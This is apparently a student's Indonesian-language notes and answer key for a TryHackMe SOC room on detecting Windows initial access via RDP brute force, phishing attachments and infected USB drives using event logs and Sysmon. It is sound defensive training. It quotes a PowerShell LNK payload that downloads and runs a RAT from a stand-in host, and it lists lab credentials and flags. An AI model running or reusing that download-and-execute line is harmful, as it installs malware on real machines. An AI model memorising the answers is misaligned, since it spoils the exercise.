# USE-CASE-Deteksi-Ancaman-Windows-1

Perkenalan
sekarang saatnya untuk menerapkan pengetahuan tersebut! Ruang ini memandu Anda melalui teknik Akses Awal dan Penemuan yang umum dan mengajarkan cara mendeteksi masing-masing teknik tersebut hanya menggunakan log peristiwa Windows, sumber log yang paling umum digunakan oleh tim SOC di dunia nyata .

Tujuan pembelajaran
Pelajari bagaimana pelaku ancaman mengakses dan membobol mesin Windows.
Pelajari teknik Akses Awal yang umum melalui contoh-contoh dunia nyata.
Berlatihlah mendeteksi setiap teknik menggunakan log peristiwa Windows.

Kredensial

Alternatifnya, Anda dapat mengakses VM dari mesin Anda yang terhubung ke VPN dengan kredensial di bawah ini:

Nama belakang
 
Administrator
 
Kata sandi
 
Aman!
 
Alamat IP
 
10.49.176.13

# AKSES AWAL MELALUI PHISING
Akses Awal
Sebelum melanjutkan, mari kita rangkum konsep Akses Awal. Bayangkan dunia maya sebagai kota besar yang dipenuhi gedung pencakar langit dan apartemen kecil—masing-masing dilindungi oleh pintu depannya sendiri. Sekarang bayangkan pelaku ancaman sebagai penjahat yang berkeliaran di jalanan pada malam hari. Beberapa dari mereka mencoba membuka kunci kantor tertentu selama berminggu-minggu. Yang lain mendobrak pintu dengan paksa. Dan beberapa hanya mencoba setiap pintu di kota sampai mereka menemukan satu pintu yang secara tidak sengaja dibiarkan terbuka.

Apa pun tujuan akhirnya, langkah pertama pelaku ancaman adalah menembus pintu depan, dan momen ketika penyerang berhasil masuk dikenal sebagai Akses Awal. Di ruangan ini, Anda akan menjelajahi berbagai metode Akses Awal, tetapi untuk saat ini, mari kita bagi menjadi dua kelompok: metode yang membutuhkan layanan yang terekspos dan metode yang bergantung pada interaksi manusia.

Layanan yang Terungkap
Tiga kelompok ancaman berupaya membobol server: yang pertama melalui RDP yang terekspos, yang kedua melalui server email, dan yang ketiga melalui MS SQL.

Menghubungkan server Windows langsung ke internet adalah tugas umum bagi tim TI - situs web perusahaan memerlukan port HTTP terbuka untuk menampilkan konten, server email tidak dapat menangani email tanpa port SMTP aktif , dan administrator TI memerlukan RDP untuk mengelola mesin dari jarak jauh. Namun, setiap layanan yang terekspos menimbulkan risiko keamanan yang besar. Dalam hitungan menit, sistem Anda yang terekspos dapat dipindai oleh bot otomatis yang mencari port terbuka, kata sandi lemah, atau kerentanan yang belum ditambal. Dan jika sesuatu tidak cukup terlindungi, pelaku ancaman akan memanfaatkan kesempatan tersebut, seperti yang dibuktikan oleh teknik MITRE berikut :

T1133 / Layanan Jarak Jauh Eksternal : Pelaku ancaman akan mencari celah keamanan RDP /VNC/ SSH dengan kata sandi lemah untuk mendapatkan akses jarak jauh ke mesin.
T1190 / Eksploitasi Aplikasi yang Menghadap Publik : Pelaku ancaman akan mencari situs web dan aplikasi yang salah konfigurasi atau rentan.
Metode yang Digerakkan Pengguna
Pelaku ancaman mengirimkan email phishing dan USB yang terinfeksi kepada korban. Korban memulai serangan itu sendiri dengan membuka email atau USB tersebut.

Namun bagaimana laptop bisa terinfeksi jika tidak terhubung ke internet? Memang, kecuali Anda sendiri membantu pelaku ancaman, sangat sulit untuk menginfeksi laptop Anda. Namun, orang sering membantu pelaku ancaman dengan mengklik tautan berbahaya, meluncurkan lampiran phishing , menggunakan perangkat lunak bajakan, mengambil perangkat USB yang tidak dikenal, dan sebagainya. Dan karena manusia masih merupakan mata rantai terlemah dalam keamanan siber dan Windows adalah sistem operasi paling populer untuk workstation pengguna, Anda kemungkinan besar akan sering menangani peringatan Windows Initial Access yang didorong oleh pengguna. Metode-metode tersebut tercakup dalam teknik MITRE berikut :

T1566 / Phishing : Pelaku ancaman menggunakan berbagai teknik phishing , memperdayai pengguna agar menjalankan malware tersebut sendiri.
T1091 / Media yang Dapat Dilepas : Pelaku ancaman menginfeksi perangkat USB dan berharap pengguna akan menggunakan USB tersebut di beberapa PC.
Penggunaan oleh Pelaku Ancaman
Beberapa metode Akses Awal semakin populer, sementara yang lain menurun, dan terdapat banyak laporan ancaman yang bagus tentang tren Akses Awal modern (misalnya  Mandiant M-Trends 2025 ). Meskipun demikian, sebagai analis SOC , Anda harus tahu bahwa pelaku ancaman akan menggunakan setiap kesempatan untuk membobol target. Misalnya, kelompok ransomware besar seperti Medusa atau Akira menggunakan semua teknik yang dijelaskan setidaknya sekali dalam kampanye mereka.

Jawablah pertanyaan-pertanyaan di bawah ini.
ID teknik MITRE manakah yang menjelaskan Akses Awal melalui server email yang rentan?

T1190

Jawaban yang Benar
Metode Akses Awal mana yang bergantung pada pengguna yang membuka lampiran email berbahaya?

Phishing

Jawaban yang Benar
 
Koneksi melalui
 
RDP




# Akses Awal melalui RDP
Risiko Paparan RDP
Sebagai analis SOC , Anda seharusnya tahu bahwa jika Anda mengekspos RDP ke dunia luar dan menetapkan kata sandi "12345678", host Anda akan diretas dalam beberapa hari. Namun, tidak semua orang memahami risiko keamanan dari RDP yang terekspos . Menurut  Censys Search , saat ini terdapat lebih dari 5.000.000 mesin yang mendukung RDP , dan banyak di antaranya sudah berada di bawah kendali pelaku ancaman. Masalah ini begitu meluas sehingga para pembela sering menyebut RDP sebagai  Protokol Penyebaran Ransomware (Ransomware Deployment Protocol) , menekankan seberapa sering pelanggaran RDP secara langsung mengakibatkan serangan ransomware.

Mendeteksi Pelanggaran RDP
Dalam skenario VM kita , administrator TI mengekspos RDP pada server produksi sehingga dapat diakses dari rumah pada akhir pekan. Kredensialnya diatur sebagai Administrator:Summer2025. Mari kita rekonstruksi apa yang terjadi selanjutnya, hanya dalam beberapa jam, dan coba deteksi di log dengan menggunakan Event Viewer ( file C:\Users\Desktop\Administrator\Practice\ RDPCase \ RDP - Security.evtx  ):

#	Langkah Serangan	Peluang Deteksi
1	Botnet Pemindai Jaringan
memindai IP kita dan mendeteksi  port RDP yang terbuka.	Tidak berlaku. Serangan jaringan berada di luar cakupan pembahasan.
2	Botnet Brute Force RDP
memulai serangan brute force terhadap nama pengguna umum
(Administrator, admin, support, dll.)	1. Buka log Keamanan dan filter untuk upaya login yang gagal (ID peristiwa 4625 )
2. Filter untuk tipe login 3 dan 10 , yang berarti login jarak jauh
3. Filter untuk login dari IP eksternal (gunakan kolom "IP Sumber")
4. Selesai. Anda telah mendeteksi potensi serangan brute force RDP
3	Akses Awal melalui RDP
Setelah sekitar 100 kali percobaan, botnet menebak
kata sandi yang benar dan memasuki sistem.	1. Lanjutkan dengan daftar dari langkah sebelumnya
. 2. Ubah filter ID peristiwa menjadi  4624 (login berhasil).
3. Periksa akun yang digunakan untuk login.
4. Sekarang Anda tahu akun mana yang digunakan untuk Akses Awal.
4	Tindakan Jahat Lebih Lanjut
Dua jam setelah pelanggaran, pelaku ancaman
masuk melalui RDP dan meninjau Desktop.	1. Lanjutkan dengan daftar dari langkah sebelumnya
. 2. Filter berdasarkan tipe login  10 , yang menunjukkan login RDP interaktif
. 3. Salin kolom "ID Login" dari peristiwa login.
4. Buka log Sysmon dan cari peristiwa dengan "ID Login" yang sama.
5. Anda akan melihat semua proses yang dimulai oleh pelaku ancaman melalui RDP.
Serangan Brute Force Pencatatan Log
Menariknya, tidak sulit untuk mendeteksi RDP yang terekspos hanya dari log Keamanan. Jika Anda menetapkan IP publik ke server Anda, menonaktifkan firewall , mengaktifkan RDP , dan menunggu sekitar satu jam - Anda akan melihat log seperti pada tangkapan layar. Botnet di seluruh dunia akan segera mulai melakukan serangan brute force pada server Anda, menghasilkan ratusan kejadian 4625 yang tidak akan Anda lewatkan! Namun, perlu dicatat bahwa RDP dapat diretas tanpa serangan brute force jika pelaku ancaman mengetahui kredensial sebelumnya , tetapi itu adalah topik untuk pembahasan lain.
<img width="1639" height="384" alt="image" src="https://github.com/user-attachments/assets/18b79e4e-73cb-4aa0-aebe-f581fd00880d" />

Untuk tugas ini, buka VM dan analisis log skenario pelanggaran RDP :
C:\Users\Administrator\Desktop\Practice\ RDP Case\ RDP -Security. evtx

Jawablah pertanyaan-pertanyaan di bawah ini.
Pengguna mana yang tampaknya paling sering menjadi sasaran serangan brute-force oleh botnet?
cara nya : buka eventviewer - di folder rdp security  - filter curent log -  masukan pencarian 4625 yang bagaimana menjelaskan upaya login gagal / attemp login failed - cari waktu pertama kali di akses/ awal akses- lihat detail - jawaban nya administrator 
SubjectUserSid S-1-0-0 
  SubjectUserName - 
  SubjectDomainName - 
  SubjectLogonId 0x0 
  TargetUserSid S-1-0-0 
  TargetUserName ADMINISTRATOR 
<img width="1363" height="710" alt="detecting windows 1" src="https://github.com/user-attachments/assets/daafffd7-1ea4-46a3-a9de-f296577740ec" />



jawaban : Administrator

Jawaban yang Benar

IP mana yang berhasil menembus host melalui RDP (Tipe Login 10)?
caranya masuk di eventviewer - file rdp security - cari di filter curent log - masukan code 4624 ini adalah code login berhasil -tekan enter - ciri nya yaitu type login 10 - cari event id nya - dan lihat detail - maka akan muncul seperti contoh di bawah ini :  
 LogonType 10 
  LogonProcessName User32  
  AuthenticationPackageName Negotiate 
  WorkstationName WIN-F89VT9IER10 
  LogonGuid {00000000-0000-0000-0000-000000000000} 
  TransmittedServices - 
  LmPackageName - 
  KeyLength 0 
  ProcessId 0x920 
  ProcessName C:\Windows\System32\svchost.exe 
  IpAddress 203.205.34.107 



<img width="1338" height="670" alt="image" src="https://github.com/user-attachments/assets/50c4d1e0-dcd0-4f49-9948-bf6078ffb92e" />

jawaban : 203.205.34.107

Jawaban yang Benar

Bisakah Anda mendapatkan Nama Workstation (hostname) sebenarnya dari pelaku ancaman?

DESKTOP-QNBC4UU

Jawaban yang Benar

# AKSES AWAL MELALUI PHISING
Kondisi Terkini Phishing
Serangan phishing masih menjadi ancaman besar karena tidak dapat diatasi semudah memblokir akses RDP . Jika pengguna memiliki akses ke internet, mereka pada akhirnya akan membawa malware ke laptop mereka, melewati firewall sepenuhnya. Menurut Laporan Tren Phishing HoxHunt untuk tahun 2025 , serangan phishing telah meningkat 41 kali lipat sejak peluncuran ChatGPT pada tahun 2022. Terlebih lagi, tingkat keberhasilan kampanye ini tetap tinggi, yang berarti pengguna masih menjadi korban. Dalam tugas ini, kita akan fokus pada dua teknik phishing yang menyebabkan pelanggaran keamanan Windows: binary berbahaya dan lampiran LNK .

Lampiran Biner
Di Windows, terdapat banyak ekstensi file yang dapat dieksekusi, dan meskipun kebanyakan orang tahu untuk tidak membuka file .exe yang tidak tepercaya , mereka biasanya kurang berhati-hati terhadap file .com , .scr , atau .cpl . Namun, semuanya dapat mengandung malware di dalamnya. Misalnya, pengguna sangat mungkin membuka file terlampir dengan nama "tryhatme.com" dengan asumsi itu adalah tautan ke undangan rapat, bukan file biner berbahaya.

Lebih buruk lagi, Windows secara default menyembunyikan ekstensi file yang dikenal, artinya file "program.exe" hanya akan ditampilkan sebagai "program". Pelaku kejahatan siber sering menyalahgunakan hal ini dengan memberi nama virus mereka seperti "invoice.pdf.exe" atau "cat.png.com" dan mengubah ikon agar sesuai dengan temanya. Lihat tangkapan layar di bawah ini untuk memahami bagaimana tampilan file berbahaya bagi pengguna biasa:

Ekstensi yang Diketahui Disembunyikan Secara Default
(invoice.pdf.exe)	<img width="668" height="256" alt="image" src="https://github.com/user-attachments/assets/6fef4adf-e658-40c5-a574-fe69af3293b7" />

Malware .COM Lebih Mencolok Jika Ekstensi Ditampilkan
(tryhatme.com)<img width="675" height="258" alt="image" src="https://github.com/user-attachments/assets/1e2e1417-ae05-40b5-aba8-aecc6acd3d84" />

Lampiran LNK
Untuk menghindari deteksi antivirus , pelaku ancaman mungkin lebih memilih melampirkan skrip PowerShell , Visual Basic, atau BAT daripada file biner. Cara populer untuk membuat skrip tampak tepercaya adalah dengan menyembunyikannya di balik pintasan LNK - file yang sama yang Anda miliki di Desktop yang mengarah ke file yang dapat dieksekusi sebenarnya di suatu tempat di folder Program Files.

Bayangkan Anda menerima email dari toko PC lokal yang mengumumkan diskon besar dan meminta Anda untuk meninjau detailnya dalam arsip terlampir. Seperti pada tangkapan layar di bawah, Discounts.zip berisi dua file: PDF dan pintasan ke situs web. Anda dengan cermat menganalisis PDF tersebut dan melihat bahwa itu hanyalah poster dengan diskon terbaru. Tertarik dengan berita tersebut, Anda bergegas membuka pintasan, hanya untuk menemukan bahwa pintasan tersebut mengarah ke perintah PowerShell , bukan ke situs web yang sah.

LNK Dengan Payload PowerShell (Kunjungi Situs Web Kami!. lnk )


Pelaku ancaman dapat menyertakan perintah apa pun di dalam kolom "Target" LNK , serta mengatur ikon pintasan apa pun. Anda dapat memverifikasinya dengan mengklik kanan file LNK , memilih "Properti", dan melihat tab "Pintasan". Kasus yang ditunjukkan di atas, misalnya, mengunduh dan menjalankan versi sederhana dari RemcosRAT - malware yang digunakan dalam banyak serangan terhadap perusahaan besar dan lembaga pemerintah. Terminal di bawah ini menunjukkan muatan LNK lengkap :

Tautan
Unduh ->
PowerShell
-> RemcosRAT
powershell.exe -c ...
# Download the encoded malware
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
# Run the malware (RemcosRAT)
start C:\\ProgramData\\r.exe;
Dalam tugas ini, Anda akan menyelidiki tiga contoh lampiran phishing yang tersimpan di:
C:\Users\Administrator\Desktop\Practice\ Phishing Case 1-3

Jawablah pertanyaan-pertanyaan di bawah ini.
Mari kita berperan sebagai pengguna awam dan tanpa berpikir panjang membuka file COM.
Jalankan file www.skype.com dari folder Phishing Case 1 , flag apa yang Anda dapatkan?

THM{misleading_extension}

Jawaban yang Benar
Lanjutkan dengan lampiran kedua dari folder Kasus Phishing 2.
Dari URL mana LNK berbahaya mengunduh malware tahap selanjutnya?

http://wp16.hqywlqpa.thm:8000/cgi-bin/f

Jawaban yang Benar
Terakhir, buka  folder Phishing Case 3 dan periksa isinya.
Apa nama file dengan ekstensi ganda yang Anda lihat di sana?

best-cat.jpg.exe

Jawaban yang Benar

# Mendeteksi Unduhan Berbahaya
Mencari unduhan berbahaya relatif mudah jika Anda mengetahui bagaimana korban melihatnya. Pertama, pengguna menggunakan peramban web atau aplikasi desktop untuk membuka lampiran phishing . Dalam kasus paling sederhana, itu akan berupa unduhan malware .exe langsung, tetapi Anda jauh lebih mungkin melihat lampiran arsip seperti .zip atau .rar yang berisi malware. Dalam hal ini, Sysmon dapat sangat membantu Anda mendeteksi setiap tahap serangan:

Sysmon
Rangkaian Peristiwa untuk Lampiran Ekstensi Ganda
# 1. Sysmon Event ID 1: Web browser is launched
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ParentImage: C:\Windows\Explorer.EXE

# 2. Sysmon Event ID 11: A file (usually archive) appears in Downloads
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TargetFilename: C:\Users\User\Downloads\invoice.zip*

# 3. Sysmon Event ID 11: Optionally, the user unarchives files to some folder
Image: C:\Windows\Explorer.EXE (or C:\Program Files\7-Zip\7zG.exe)
TargetFilename: C:\Users\User\Downloads\invoice.pdf.exe

# 4. Sysmon Event ID 1: The user double-clicks the unarchived file
Image: C:\Users\User\Downloads\invoice.pdf.exe
ParentImage: C:\Windows\Explorer.EXE


Catatan tentang Lampiran LNK
Berbeda dengan lampiran biner, file LNK memiliki kemampuan yang sangat menarik dan penting - file ini meninggalkan sedikit jejak eksekusi. Perhatikan kasus pada tangkapan layar di bawah ini, di mana pengguna mengunduh file LNK yang terlihat seperti pintasan Google Chrome, tetapi sebenarnya menjalankan beberapa muatan PowerShell .

Setelah pengguna menjalankan pintasan, Windows Explorer membaca kolom "Target" pada file LNK dan membuatnya tampak seolah-olah explorer.exe menjalankan PowerShell secara langsung. Namun, Anda dapat mengidentifikasi apakah itu memang phishing LNK atau vektor serangan lain dengan mencari peristiwa pembuatan file sebelumnya - file LNK pasti pernah muncul di suatu tempat di folder Unduhan sebelumnya:

<img width="1155" height="530" alt="image" src="https://github.com/user-attachments/assets/fc938a3d-53cd-4f24-9d7f-1f3fb22afa28" />

Dalam tugas ini, mari kita coba menyelidiki kasus phishing ketiga dengan memeriksa log Sysmon terlampir :
C:\Users\Administrator\Desktop\Practice\ Phishing Case 3\ Phishing - Sysmon . evtx

Jawablah pertanyaan-pertanyaan di bawah ini.
File apa yang diunduh pengguna melalui peramban web?

C:\Users\Administrator\Downloads\top-cats.zip

Jawaban yang Benar
Di folder mana pengguna mengekstrak file yang mencurigakan tersebut?

C:\Users\Administrator\Pictures

Jawaban yang Benar
Berapakah ID proses dari malware phishing yang diluncurkan?

5484

Jawaban yang Benar
Terakhir, domain berbahaya mana yang coba dihubungkan oleh malware tersebut?

rjj.store

Jawaban yang BENAR

# AKSES AWAL MELALUI USB 
Initial Access via USB
Risiko Media yang Dapat Dilepas
Meskipun sebagian orang mungkin percaya bahwa era flash drive USB yang terinfeksi sudah lama berlalu dan layanan cloud telah sepenuhnya menggantikannya, pelaku ancaman akan membantah hal tersebut, seperti yang dibuktikan oleh serangan Camaro Dragon atau Raspberry Robin . Lebih jauh lagi, akses awal melalui USB yang terinfeksi dapat melewati firewall, mirip dengan phishing , dan dapat memulai rantai serangan bahkan tanpa akses internet dan terus menyebar tanpa interaksi pengguna.

Kotak Pengiriman USB

Bayangkan Anda bekerja di TryHatMe Inc. dan menerima paket kiriman berisi topi mewah dan USB berlabel "Hadiah dari HR". Anda mencolokkannya, GIF yang tidak berbahaya muncul, dan Anda menghubungi HR untuk mengucapkan terima kasih atas hadiah tersebut. Namun, sementara HR memahami maksud Anda, malware dari USB tersebut telah menyebar ke laptop Anda. ( Kasus Nyata )

Kasus Layanan Cetak

Skenario umum lainnya melibatkan pihak ketiga seperti layanan pencetakan. Misalkan Anda mengunjungi salah satu tempat tersebut dan menyerahkan USB Anda untuk mencetak dokumen. Sistem mereka, yang sudah terinfeksi worm, meneruskan malware ke flash drive Anda. Kemudian, Anda membawa malware tersebut kembali ke PC rumah Anda, dan rantai infeksi berlanjut. Sekarang, mari kita pelajari cara mendeteksi hal ini sebelum terlambat! ( Kisah Nyata )

Mendeteksi USB yang Terinfeksi
Meskipun terdapat banyak teknik canggih tentang cara menjalankan malware dari USB secara otomatis segera setelah flash drive dicolokkan, sebagian besar kasus terjadi hanya karena pengguna sendiri yang menjalankan malware tersebut. Misalnya:

Malware menyembunyikan semua file sah di USB dan membuat file berbahaya " RECOVERY.lnk " .
Malware membuat file biner " Photos.exe " dan mengatur ikonnya agar terlihat seperti folder biasa.
Malware membuat salinan file dengan ekstensi ganda, seperti " photo_2024_1_12.jpg.exe "
Menariknya, deteksi Akses Awal melalui USB terlihat sangat mirip dengan lampiran phishing . Karena kedua metode tersebut bergantung pada pengguna yang menjalankan biner berbahaya melalui antarmuka grafis (explorer.exe), Anda mungkin kesulitan memahami bagaimana tepatnya serangan dimulai. Namun, dalam beberapa kasus, Anda mungkin menemukan bukti eksekusi dari drive eksternal seperti "E:\malware.exe": <img width="2732" height="1022" alt="image" src="https://github.com/user-attachments/assets/235de9b0-b541-44f5-b1b2-d2f6a585e2ae" />


Untuk tugas ini, Anda akan menyelidiki rantai serangan tipikal melalui USB menggunakan log Sysmon terlampir :
C:\Users\Administrator\Desktop\Practice\USB Case\USB- Sysmon . evtx

Jawablah pertanyaan-pertanyaan di bawah ini.
File USB mana yang dijalankan oleh pengguna?

E:\Open Sandisk 4GB USB.exe

Jawaban yang Benar
File mencurigakan mana yang dijatuhkan malware ke disk?
(Format: jalur lengkap ke file, misalnya C:\file.txt)

C:\Users\Public\Documents\winupdate.exe

Jawaban yang Benar
Ke USB lain mana malware tersebut menyebar?
(Format: hanya hurufnya, misalnya X:)

F:

Jawaban yang Benar

# Kesimpulan
Kerja bagus menyelesaikan ruangan ini! Mengetahui metode Akses Awal yang umum membantu mencegahnya, dan pengetahuan yang Anda peroleh tentang mendeteksi serangan pada tahap awal akan sangat berharga untuk penanganan peringatan yang cepat dan respons insiden yang tepat waktu.

Poin-Poin Penting
Dua metode akses awal Windows yang paling umum adalah melalui layanan yang terekspos dan serangan yang dilakukan oleh pengguna.
Akses awal melalui RDP dapat dengan mudah dideteksi menggunakan log otentikasi default (4624/4625)
Serangan yang dilakukan oleh pengguna paling baik dideteksi melalui peristiwa eksekusi proses, sebaiknya yang berasal dari Sysmon.
Setiap metode Akses Awal (seperti LNK ) memiliki fitur unik yang akan Anda pelajari melalui praktik.
